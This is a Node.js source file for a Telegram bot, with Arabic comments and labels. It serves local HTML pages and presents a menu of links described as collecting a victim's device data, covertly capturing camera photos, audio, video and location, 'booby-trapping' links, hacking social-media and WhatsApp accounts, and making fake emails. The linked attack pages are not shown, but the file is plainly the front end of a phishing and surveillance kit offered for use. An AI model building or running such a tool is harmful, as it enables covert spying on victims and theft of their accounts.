const { Telegraf } = require('telegraf');
const express = require('express');
const path = require('path');

// إعداد خادم Web لتقديم صفحات الـ HTML الموجودة في مجلد التطبيق
const app = express();
const PORT = process.env.PORT || 3000;

// توفير كافة ملفات الـ HTML والبيانات في المجلد الحالي تلقائياً
app.use(express.static(__dirname));

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

// إعداد بوت التلجرام
const bot = new Telegraf(process.env.bott);

// جلب رابط السيرفر العام من متغيرات البيئة أو استخدام الرابط المحلي
const BASE_URL = process.env.URL || `http://localhost:${PORT}`;

bot.start((ctx) => {
  return ctx.reply('مرحباً بك! يمكنك التمتع بالخدمات واختيار ما يناسبك من الخيارات المتاحة:', {
    reply_markup: {
      inline_keyboard: [
        [
          { text: 'جمع معلومات الجهاز 🔬', url: `${BASE_URL}/fe.html` },
          { text: 'اختراق كاميرا ام وخ 📸', url: `${BASE_URL}/c.html` }
        ],
        [
          { text: 'تسجيل صوت الضحية 🎙️', url: `${BASE_URL}/ca.html` },
          { text: 'تصوير الضحية فيديو 🎥', url: `${BASE_URL}/i.html` }
        ],
        [
          { text: 'اختراق كاميرا المراقبة 📡', url: `${BASE_URL}/g.html` },
          { text: 'اختراق الموقع 🗺️', url: `${BASE_URL}/new_location.html` }
        ],
        [
          { text: 'تلغيم رابط ⚠️', url: `${BASE_URL}/b.html` },
          { text: 'اختراق واتساب 🟢', url: `${BASE_URL}/k.html` }
        ],
        [
          { text: 'اختراق انستغرام 📸', url: `${BASE_URL}/lo.html` },
          { text: 'اختراق تيك توك 💻', url: `${BASE_URL}/mm.html` }
        ],
        [
          { text: 'سحب صور متعددة 🖼️', url: `${BASE_URL}/multiple_photos.html` },
          { text: 'اختراق فيسبوك 📘', url: `${BASE_URL}/n.html` }
        ],
        [
          { text: 'اختراق تويتر 💽', url: `${BASE_URL}/r.html` },
          { text: 'اختراق يوتيوب 🔴', url: `${BASE_URL}/s.html` }
        ],
        [
          { text: 'خدمات الموقع المتقدمة 🌐', url: `${BASE_URL}/t.html` },
          { text: 'إنشاء إيميل وهمي ✉️', url: `${BASE_URL}/emails.json` }
        ],
        [
          { text: 'اختراق الحسابات 🔐', url: `${BASE_URL}/xx.html` },
          { text: 'فحص الحالة 🎯', url: `${BASE_URL}/ok.html` }
        ]
      ]
    }
  });
});

bot.launch().then(() => {
  console.log('Bot is running successfully!');
});

// التعامل مع الإيقاف الآمن للبوت
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
